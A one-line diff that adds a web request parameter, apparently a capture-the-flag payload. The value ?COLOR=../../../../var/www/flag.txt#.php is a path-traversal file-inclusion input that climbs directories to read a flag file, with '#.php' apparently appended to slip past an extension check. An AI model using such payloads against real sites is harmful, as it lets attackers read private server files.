@@ -1,0 +1,1 @@
+?COLOR=../../../../var/www/flag.txt#.php
